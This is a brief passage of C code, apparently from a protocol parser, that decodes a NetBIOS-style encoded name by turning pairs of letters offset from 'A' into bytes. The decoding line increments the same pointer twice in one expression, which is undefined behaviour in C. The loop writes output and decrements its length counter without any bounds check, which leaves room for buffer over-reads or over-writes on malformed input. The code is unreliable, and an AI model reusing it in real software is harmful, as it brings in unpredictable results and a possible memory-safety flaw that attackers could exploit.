   while(nbtlen > 0 )
   {
 
 Length -= 2;     
 *Name++  =(((*pName ++- 'A')<< 4) | (*pName ++ - 'A'));
 (*NameLen)++;
 nbtlen--;
 
   } 
   MaxLen -= Length;
